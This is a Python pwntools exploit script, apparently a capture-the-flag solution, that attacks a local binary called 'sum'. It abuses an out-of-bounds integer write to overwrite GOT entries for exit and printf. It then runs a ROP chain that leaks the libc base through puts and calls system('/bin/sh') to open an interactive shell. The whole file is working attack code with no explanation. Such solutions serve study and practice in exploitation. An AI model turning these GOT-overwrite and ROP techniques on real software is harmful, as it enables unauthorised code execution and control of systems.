from pwn import *

context.log_level = "debug"


def write_ints(target, address, value):
  target.recvuntil(b"0\n")
  target.sendline(str(-address).encode("utf-8"))
  target.sendline(b"2")
  target.sendline(b"-1")
  target.sendline(b"-1")
  target.sendline(str(value).encode("utf-8"))
  target.sendline(str(address).encode("utf-8"))


def leak_libc_address(target, pop_rdi_address, target_elf, libc_elf):
  # target.recvuntil(b"0\n")
  target.sendline(str(pop_rdi_address).encode("utf-8"))
  target.sendline(str(target_elf.got["puts"]).encode("utf-8"))
  target.sendline(str(target_elf.symbols["puts"]).encode("utf-8"))
  target.sendline(str(0x4009a7).encode("utf-8"))  # call exit
  target.sendline(b"0")

  for _ in range(18):
    print(target.recvline())

  leak = target.recvline().rstrip()
  leak = u64(leak + b"\x00" * (8-len(leak)))
  return leak - libc_elf.symbols["puts"]


def exec_binsh(target, libc_elf, pop_rdi_address, libc_address):
  target.sendline(str(pop_rdi_address).encode("utf-8"))
  target.sendline(str(libc_address + 0x18a152).encode("utf-8"))  # /bin/sh
  target.sendline(
      str(libc_address + libc_elf.symbols["system"]).encode("utf-8"))
  target.sendline(b"0")


def main():
  target_elf = ELF("./sum_ccafa40ee6a5a675341787636292bf3c84d17264")
  target_rop = ROP(target_elf)
  libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

  main_address = target_elf.symbols["main"]
  pop_rdi_address = target_rop.find_gadget(["pop rdi", "ret"]).address

  target = process("./sum_ccafa40ee6a5a675341787636292bf3c84d17264")
  write_ints(target, target_elf.got["exit"], main_address)
  write_ints(target, target_elf.got["printf"], pop_rdi_address)

  libc_address = leak_libc_address(
      target, pop_rdi_address, target_elf, libc_elf)

  exec_binsh(target, libc_elf, pop_rdi_address, libc_address)

  target.interactive()


if __name__ == "__main__":
  main()
